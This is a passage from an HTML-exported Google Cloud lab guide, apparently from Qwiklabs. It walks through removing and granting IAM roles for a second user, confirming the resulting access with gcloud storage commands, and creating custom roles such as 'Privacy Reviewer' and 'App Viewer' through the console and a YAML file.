height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Run the following commands to create a file and try to upload it to the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "this is another file" &gt; sample2.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud storage cp sample2.txt gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>Username 2 cannot upload the file to Cloud Storage because it only has the Project Viewer role.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Copying file://sample2.txt </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERROR: User xxx does not have permission to access b instance (or it may not exist): student-xx-xxxx@qwiklabs.net does not have storage.objects.create access to the Google Cloud Storage object.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><h4 id='task-4-remove-project-access'><span>Task 4. Remove project access</span></h4><p><span>In this task, you remove the Project Viewer role for Username 2. You verify that Username 2 has lost access to the Cloud Storage bucket.</span></p><h5 id='remove-the-project-viewer-role-for-username-2'><span>Remove the Project Viewer role for Username 2</span></h5><ol start='' ><li><p><span>Switch to the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>IAM &amp; admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Username 2</span></strong><span>, click on the pencil icon edit (</span><img src="https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D" referrerpolicy="no-referrer" alt="Edit icon"><span>) button.</span></p></li><li><p><span>Click the delete icon next to the assigned role.</span></p></li><li><p><span>Click on </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><span>Notice that the user has disappeared from the list! The user has no access now. Username 2 still has a Google Cloud account, but has no access to the project.</span></p><h5 id='verify-that-username-2-has-lost-access'><span>Verify that Username 2 has lost access</span></h5><ol start='' ><li><p><span>Switch to the </span><strong><span>Username 2</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>Run the following command in Cloud Shell to verify that </span><strong><span>Username 2</span></strong><span> can no longer view the file in the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud storage ls gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERROR: User xxx does not have permission to access b instance (or it may not exist): student-xx-xxxx@qwiklabs.net does not have storage.objects.list access to the Google Cloud Storage bucket.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>If you can still see the file, the access change has not taken effect yet. Wait a minute and try the command again until you see </span><code>Permission denied on resource</code><span>.</span></p></li><li><p><span>From the </span><strong><span>Username 2</span></strong><span> console, try to access the Compute Engine service. On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>. You will not even be able to view the Compute Engine dashboard.</span></p></li></ol><p><img src="images/Hc1Su7Gsaz%2B%2BzbfZf3pkmdahh8gn9uKwP0Gv7RnNxWI%3D.png" referrerpolicy="no-referrer" alt="Additional Access Required"></p><p><strong><span>Note:</span></strong><span> </span><strong><span>Username 2</span></strong><span> still has a Google Cloud account, but has no access to the project from either the Cloud Console or the CLI.</span></p><h4 id='task-5-add-storage-access'><span>Task 5. Add storage access</span></h4><p><span>In this task, you add storage object viewer permissions for Username 2 and verify that the user can view the contents of the Cloud Storage bucket.</span></p><h5 id='add-storage-object-viewer-only-permissions-for-username-2'><span>Add storage object viewer only permissions for Username 2</span></h5><ol start='' ><li><p><span>Copy the value of </span><strong><span>Username 2</span></strong><span> from the Qwiklabs </span><strong><span>Connection Details</span></strong><span> dialog.</span></p></li><li><p><span>Switch to the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>IAM &amp; admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>GRANT ACCESS</span></strong><span> to add a user.</span></p></li><li><p><span>For </span><strong><span>New principals</span></strong><span>, paste the </span><strong><span>Username 2</span></strong><span> value you copied from the Qwiklabs </span><strong><span>Connection Details</span></strong><span> dialog.</span></p></li></ol><p><span>In the next step, you will use a predefined role to give Storage Object Viewer permissions to Username 2. Feel free to explore the available predefined roles.</span></p><ol start='' ><li><p><span>For </span><strong><span>Select a role</span></strong><span>, select </span><strong><span>Cloud Storage &gt; Storage Object Viewer</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><h5 id='verify-that-username-2-has-storage-access'><span>Verify that Username 2 has storage access</span></h5><ol start='' ><li><p><span>Switch to the </span><strong><span>Username 2</span></strong><span> Cloud Console tab.</span></p></li></ol><p><strong><span>Note:</span></strong><span> </span><strong><span>Username 2</span></strong><span> doesn&#39;t have the Project Viewer role, so the user still can&#39;t see the project or any of its resources in the Cloud Console. For example, Username 2 still cannot view the Compute Engine dashboard. However, Username 2 has specific access to view Cloud Storage and can make API calls to view storage.</span></p><ol start='' ><li><p><span>Run the following command in Cloud Shell to view the contents of the bucket you created earlier:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud storage ls gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>As you can see, </span><strong><span>Username 2</span></strong><span> now has limited access to view Cloud Storage.</span></p><h4 id='task-6-create-custom-roles'><span>Task 6. Create custom roles</span></h4><p><span>In this task, you create a custom role for a job role of Privacy Reviewer. This role performs data privacy reviews and needs permissions to view data in various different services, such as Cloud Storage, Cloud Bigtable, and Cloud Spanner</span></p><p><span>Google Cloud also allows for the creation of custom roles. Custom roles can be used to map your organization&#39;s specific job roles to Google Cloud permissions. A custom role can combine permissions from multiple Google Cloud services into one role and then share that new role across your entire organization.</span></p><p><strong><span>Note:</span></strong><span> Generally it is better to use predefined roles first, because they are managed by Google. Creating and using custom roles allows for specific permissions to be set, but add operational overhead because they must be manually managed.</span></p><p>&nbsp;</p><p><span>Custom roles can also be created based on an existing predefined role. However, if the predefined role that your custom role is based on changes after you create your custom role, those changes are not inherited by the custom role.</span></p><p><span>To create a custom role, a caller must possess the </span><code>iam.roles.createpermission</code><span>. By default, the owner of a project or an organization has this permission and can create and manage custom roles. In this lab, Username 1 is a project owner.</span></p><h5 id='create-a-custom-role-using-the-cloud-console'><span>Create a custom role using the Cloud Console</span></h5><ol start='' ><li><p><span>Switch to the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>IAM &amp; admin &gt; Roles</span></strong><span>. This page currently displays all the predefined roles. Notice that there are many of them (there are several hundred pages of them).</span></p></li><li><p><span>Click </span><strong><span>Create Role</span></strong><span>.</span></p></li><li><p><span>Use the following values for the Role properties:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Title</span></strong></th><th><strong><span>Description</span></strong></th><th><strong><span>ID</span></strong></th><th><strong><span>Role launch stage</span></strong></th></tr></thead><tbody><tr><td><code>Privacy Reviewer</code></td><td><code>Custom role to perform data reviews</code></td><td><code>privacyreviewer</code></td><td><code>Alpha</code></td></tr></tbody></table></figure><p><span>Each of the placeholder values is described below:</span></p><ul><li><p><strong><span>Title</span></strong><span> is a friendly title for the role, such as &quot;Role Viewer.&quot;</span></p></li><li><p><strong><span>Description</span></strong><span> is a short description about the role, such as &quot;My custom role description.&quot;</span></p></li><li><p><strong><span>ID</span></strong><span> must be unique.</span></p></li><li><p><strong><span>Role launch stage</span></strong><span> indicates the stage of a role in the launch lifecycle, such as Alpha, Beta, GA, or Disabled.</span></p></li></ul><ol start='' ><li><p><span>Click </span><strong><span>Add permissions</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Filter</span></strong><span> field, type </span><code>storage</code><span>, and then press </span><strong><span>Enter</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>storage.buckets.list</span></strong><span>, </span><strong><span>storage.objects.list</span></strong><span>, and </span><strong><span>storage.objects.get</span></strong><span>, and then click </span><strong><span>Add</span></strong><span>. </span><img src="images/N49h1Du%2B5Q1nwxNz4gqN%2FXyVGC4kpZ3nbQ8scYLDJ%2Bk%3D.png" referrerpolicy="no-referrer" alt="Add permissions dialog filtered to list storage roles"></p></li></ol><p><strong><span>Note:</span></strong><span> To add required permissions you may need to see next pages.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Add permissions</span></strong><span> again.</span></p></li><li><p><span>In the </span><strong><span>Filter</span></strong><span> field, type </span><code>spanner</code><span>, and then press </span><strong><span>Enter</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>spanner.databases.get</span></strong><span> and </span><strong><span>spanner.databases.list</span></strong><span>, and then click </span><strong><span>Add</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add permissions</span></strong><span> again.</span></p></li><li><p><span>In the </span><strong><span>Filter</span></strong><span> field, type </span><code>bigtable</code><span>, and then press </span><strong><span>Enter</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>bigtable.tables.get</span></strong><span>, </span><strong><span>bigtable.tables.list</span></strong><span>, and </span><strong><span>bigtable.tables.readRows</span></strong><span>, and then click </span><strong><span>Add</span></strong><span>.</span></p></li></ol><p><span>Your permissions should look like this:</span></p><p><img src="images/AIKNUnRVflZTx9V2xjLglDCmKfI0uvHSdt13sQd3txI%3D.png" referrerpolicy="no-referrer" alt="Eight assigned permissions"></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Your new custom role should now be displayed at the top of the Roles table.</span></p><h5 id='create-a-custom-role-using-the-cli-and-yaml-file'><span>Create a custom role using the CLI and YAML file</span></h5><ul><li><p><span>Roles can also be created using the CLI and a YAML file. The YAML file contains the role definition and is in the form:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">title: [ROLE_TITLE]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">description: [ROLE_DESCRIPTION]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stage: [LAUNCH_STAGE]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">includedPermissions:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- [PERMISSION_1]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- [PERMISSION_2]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p>&nbsp;</p><ul><li><p><span>So the YAML for the role you just created in the Cloud Console would look like:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">title: Privacy Reviewer</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">description: Custom role to perform data reviews</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stage: ALPHA</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">includedPermissions:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.buckets.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.objects.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.objects.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- spanner.databases.get- spanner.databases.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- bigtable.tables.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- bigtable.tables.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- bigtable.tables.readRows</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 248px;"></div><div class="CodeMirror-gutters" style="display: none; height: 248px;"></div></div></div></pre><p>&nbsp;</p><p><span>Do not copy the YAML file above; you will create a different role using the CLI.</span></p><ol start='' ><li><p><span>Verify that you are still on the browser tab for </span><strong><span>Username 1</span></strong><span>, and open Cloud Shell if it is not already open.</span></p></li><li><p><span>To create a new file called </span><strong><span>role.yaml</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano role.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Copy the following role definition and paste into the nano editor in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">title: App Viewer</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">description: Custom role to view apps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stage: ALPHA</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">includedPermissions:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- compute.instances.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- compute.instances.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- appengine.versions.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- appengine.versions.list</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Press </span><strong><span>CTRL+X,</span></strong><span> press </span><strong><span>Y</span></strong><span>, and then press </span><strong><span>Enter</span></strong><span> to save the file.</span></p></li><li><p><span>To create a new role, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles create app_viewer --project \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$DEVSHELL_PROJECT_ID --file role.yaml</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>You will see the following output.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: 